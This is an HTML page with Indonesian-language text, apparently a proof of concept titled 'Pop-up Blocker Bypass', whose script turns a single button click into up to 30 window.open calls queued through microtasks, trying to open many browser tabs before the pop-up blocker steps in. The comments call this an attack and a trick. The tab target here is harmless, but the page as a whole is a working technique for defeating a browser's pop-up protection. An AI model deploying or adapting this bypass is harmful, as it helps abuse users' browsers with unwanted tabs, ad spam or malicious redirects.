<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pop-up Blocker Bypass (Race Condition)</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
        .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
        h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
        p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
        button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
        button:hover { background: #b71c1c; }
        #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
        .log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
    </style>
</head>

<body>
<div class="panel" id="main-panel">
    <h1>Pop-up Blocker Bypass</h1>
    <p>Memanfaatkan Race Condition (Microtask) untuk membuka banyak tab sebelum diblokir.</p>
    <button id="start-btn" type="button">Mulai Race Condition</button>
    <div id="status" role="status">Menunggu interaksi...</div>
    <div class="log" id="log">Log akan muncul di sini...</div>
</div>

<script>
    const startBtn = document.getElementById("start-btn");
    const statusDiv = document.getElementById("status");
    const logDiv = document.getElementById("log");

    let openedCount = 0;
    let isRunning = false;

    function log(msg) {
        logDiv.innerHTML += "<br>> " + msg;
        console.log(msg);
    }

    function bukaTab() {
        try {
            // Membuka tab baru ke Google
            const win = window.open('https://google.com', '_blank');
            if (win) {
                openedCount++;
            }
        } catch (e) {}
    }

    startBtn.addEventListener("click", () => {
        if (isRunning) return;
        isRunning = true;
        
        startBtn.disabled = true;
        statusDiv.textContent = "Memicu Race Condition...";
        log("Memulai serangan...");

        // TRIK: Gunakan queueMicrotask untuk menembak secepat mungkin
        // Kita akan melakukan loop sebanyak 20 kali di dalam microtask
        queueMicrotask(() => {
            // Loop Sinkron
            for (let i = 0; i < 20; i++) {
                bukaTab();
            }

            // Jika masih ada sisa, coba lagi via microtask berikutnya
            queueMicrotask(() => {
                for (let i = 0; i < 10; i++) {
                    bukaTab();
                }

                // Update status
                statusDiv.textContent = `Selesai! Berhasil membuka ${openedCount} tab.`;
                statusDiv.style.color = "#4CAF50";
                log(`Total tab dibuka: ${openedCount}`);
                isRunning = false;
                startBtn.disabled = false;
            });
        });
    });
</script>
</body>
</html>
